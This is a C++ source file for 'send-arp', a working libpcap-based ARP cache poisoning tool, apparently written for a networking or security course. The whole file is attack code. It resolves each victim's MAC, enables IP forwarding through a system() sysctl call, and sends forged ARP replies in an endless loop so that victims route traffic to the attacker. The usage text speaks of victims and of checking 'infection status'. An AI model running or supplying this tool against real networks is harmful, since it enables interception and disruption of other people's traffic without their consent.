#include <cstdio>
#include <pcap.h>
#include <vector>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct ArpTarget {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
};

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
    printf("\nTo check infection status:\n");
    printf("1. On victim machine: arp -a\n");
    printf("2. On victim machine: ping -t 8.8.8.8\n");
    printf("3. On attacker machine: run Wireshark to verify packets\n");
}

Mac getMacAddress(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket failed");
        return Mac::nullMac();
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl failed");
        close(fd);
        return Mac::nullMac();
    }

    close(fd);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Mac getVictimMac(pcap_t* pcap, Mac myMac, Ip senderIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(senderIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return Mac::nullMac();
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet_data;
        res = pcap_next_ex(pcap, &header, &packet_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) return Mac::nullMac();

        EthArpPacket* reply = (EthArpPacket*)packet_data;
        if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(reply->arp_.sip_) != senderIp) continue;

        return reply->arp_.smac_;
    }
}

void sendArpSpoof(pcap_t* pcap, Mac myMac, Mac victimMac, Ip targetIp, Ip victimIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = victimMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = victimMac;
    packet.arp_.tip_ = htonl(victimIp);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    system("sysctl -w net.ipv4.ip_forward=1");

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac myMac = getMacAddress(dev);
    if (myMac.isNull()) {
        fprintf(stderr, "Couldn't get my MAC address\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    printf("My MAC: %s\n", std::string(myMac).c_str());

    std::vector<ArpTarget> targets;

    for (int i = 2; i < argc; i += 2) {
        ArpTarget target;
        target.senderIp = Ip(argv[i]);
        target.targetIp = Ip(argv[i + 1]);

        printf("Getting MAC address for %s...\n", argv[i]);
        target.senderMac = getVictimMac(pcap, myMac, target.senderIp);
        if (target.senderMac.isNull()) {
            fprintf(stderr, "Failed to get MAC address for %s\n", argv[i]);
            continue;
        }
        printf("Sender MAC: %s\n", std::string(target.senderMac).c_str());

        targets.push_back(target);
    }

    while (true) {
        for (const auto& target : targets) {
            sendArpSpoof(pcap, myMac, target.senderMac, target.targetIp, target.senderIp);
        }
        sleep(1);
    }

    pcap_close(pcap);
    return 0;
}
